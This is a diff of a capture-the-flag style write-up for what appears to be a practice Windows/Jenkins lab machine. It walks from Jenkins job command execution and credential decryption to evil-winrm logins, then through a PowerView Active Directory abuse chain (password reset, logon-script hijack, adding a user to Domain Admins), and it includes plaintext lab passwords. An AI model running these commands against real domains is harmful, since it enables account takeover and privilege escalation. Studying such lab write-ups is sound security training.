@@ -8,16 +8,37 @@ nmap -p- -sVC 10.10.11.132 -oN nmap_scan --min-rate 5000 -vv
 
 <img width="668" height="267" alt="image" src="https://github.com/user-attachments/assets/2633ba58-3d53-459b-8565-af5830153336" />
 
-### On port 80 we have a "open to receive innovative automation ideas" on port 8080
+### On port 80 we have a "open to receive innovative automation ideas" who redirect us to port 8080
 
 <img width="1175" height="692" alt="image" src="https://github.com/user-attachments/assets/0c63ee21-91c5-4b79-ae5c-6f4b864f7c0b" />
 
+### We can create an accoutn on port 8080 
 
-## need to pute accoutn + 
+<img width="721" height="615" alt="image" src="https://github.com/user-attachments/assets/6384959b-b174-4276-baaa-2e0e3a162f50" />
+
+### We go to New Item
+
+<img width="1905" height="601" alt="image" src="https://github.com/user-attachments/assets/07bcb08d-d77b-4d32-a325-78225167c12f" />
+
+### We create a project / job
+
+<img width="1812" height="933" alt="image" src="https://github.com/user-attachments/assets/782556d3-60f3-44da-919f-fc323923240c" />
+
+### We put on "Build Triggers" -> "Build periodically"
+
+```
+* * * * *
+```
+
+<img width="1808" height="950" alt="image" src="https://github.com/user-attachments/assets/b6d733c7-6c4c-4459-b1cc-337acac99115" />
+
+### And on the cmd the command who want us to run
 
 
+<img width="1628" height="730" alt="image" src="https://github.com/user-attachments/assets/224ec909-c46d-4a9c-953d-8f83941b646a" />
 
-### After we create a job we can insert this command to see what account are in ".jenkins"
+
+###  We create a job , insert this command to see what account are in ".jenkins"
 
 ```
 cmd /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users" 
@@ -156,17 +177,20 @@ python3 jenkins_offline_decrypt.py master.key util.secret creds.xml
 ```
 oliver:c1cdfun_d2434
 ```
-#Oliver
+# Oliver
 
 
-### We connect as oliver
+### We connect as oliver and find the user flag
 
 ```
 evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
 ```
 
-
 <img width="1061" height="202" alt="image" src="https://github.com/user-attachments/assets/0bc7dffc-97e1-4b88-92ed-f679b6f3b33f" />
+
+
+<img width="616" height="283" alt="image" src="https://github.com/user-attachments/assets/4905a096-b475-41ed-abdd-514b001e6c98" />
+
 
 
 ### We upload SharpHound.exe
@@ -191,4 +215,187 @@ download 20250916050535_BloodHound.zip
 ```
 
 <img width="976" height="251" alt="image" src="https://github.com/user-attachments/assets/eb2dbe4d-727b-4de3-9c80-3d3dfe6bc970" />
+
+
+### On Bloodhound we find the chain 
+
+
+<img width="1606" height="992" alt="image" src="https://github.com/user-attachments/assets/d9ff2782-b4f5-4da8-b2aa-720d6a7ac467" />
+
+
+<img width="1143" height="214" alt="image" src="https://github.com/user-attachments/assets/2ecaa0ba-aa77-4dc3-bbe7-5726f2e630c3" />
+
+# Oliver -> Smith -> Maria -> Root
+
+# Oliver -> Smith ( have ForceChangePassword )
+
+<img width="531" height="129" alt="image" src="https://github.com/user-attachments/assets/431c4647-cf48-4ba2-8d0b-39e35cebbb82" />
+
+### First we uplode powerview
+
+```
+upload powerview.ps1
+```
+### We execute powerview
+
+```
+. .\powerview.ps1
+```
+
+### We change the passwd
+
+```
+$newpass = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
+```
+
+
+```
+Set-DomainUserPassword -Identity smith -AccountPassword $newpass
+```
+
+<img width="977" height="407" alt="image" src="https://github.com/user-attachments/assets/0b810058-d768-4ce4-bb43-4cda5a007726" />
+
+
+# Smith -> Maria ( have GenericWrite )
+
+<img width="639" height="153" alt="image" src="https://github.com/user-attachments/assets/c43d6037-aa2d-45e4-a28e-c3b3320eacf1" />
+
+
+### First we connect to Smith
+
+```
+evil-winrm -i 10.10.11.132 -u "smith" -p 'Password1234!'
+```
+
+### We go to programdata
+
+```
+cd c:\programdata
+```
+
+### Upload powerview
+
+```
+upload powerview.ps1
+```
+### Run powerview
+
+```
+. .\powerview.ps1
+```
+
+### Copy maria desktop
+
+```
+echo "ls \users\maria\desktop > \programdata\out" > cmd.ps1
+```
+
+```
+Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
+```
+
+```
+type out
+```
+
+<img width="953" height="517" alt="image" src="https://github.com/user-attachments/assets/831ebbe5-ce14-42cf-87fc-d8e253f8afc0" />
+
+
+```
+echo "copy c:\users\maria\desktop\Engines.xls c:\programdata\Engines.xls" > cmd.ps1
+```
+
+
+```
+Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
+```
+
+
+<img width="1114" height="360" alt="image" src="https://github.com/user-attachments/assets/2c60abfe-3ee3-4b93-a412-8fc7bf357279" />
+
+
+### We download the file and open 
+
+```
+download Engines.xls
+```
+
+<img width="882" height="162" alt="image" src="https://github.com/user-attachments/assets/fe525e8c-fe40-4fb7-b556-5b44d0c72f84" />
+
+
+# Maria -> Root ( Have WriteOwner )
+
+<img width="748" height="219" alt="image" src="https://github.com/user-attachments/assets/604bdb63-f5ae-4c68-90df-841f1047fbf5" />
+
+
+### We connect as Maria
+
+```
+evil-winrm -i 10.10.11.132 -u "maria" -p "W3llcr4ft3d_4cls"
+```
+
+```
+cd c:\programdata
+```
+
+### Here i make a new directory , becouse the powerview dident work in appdata 
+
+```
+mkdir a
+```
+
+```
+cd a
+```
+
+```
+upload powerview.ps1
+```
+
+
+```
+. .\powerview.ps1
+```
+
+
+```
+Invoke-ACLScanner -ResolveGUIDs | ? { $_.IdentityReferenceName -like 'maria' }
+```
+
+<img width="952" height="279" alt="image" src="https://github.com/user-attachments/assets/3b1cc8e5-87d7-4545-abe5-46df232a31c1" />
+
+
+### Make Maria to have full control 
+
+```
+Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
+```
+
+```
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights all
+```
+
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
+```
+
+<img width="823" height="172" alt="image" src="https://github.com/user-attachments/assets/0e0d3c52-6df7-4598-a3c4-b8567ff8a299" />
+
+### After that we loggout and loggin agina 
+
+```
+evil-winrm -i 10.10.11.132 -u "maria" -p "W3llcr4ft3d_4cls"
+```
+
+
+### And we can read root flag in 
+
+```
+C:\Users\Administrator\Desktop
+```
+<img width="556" height="291" alt="image" src="https://github.com/user-attachments/assets/feb2b908-aae0-4478-9c54-464205f3f057" />
+
+
+
+
 
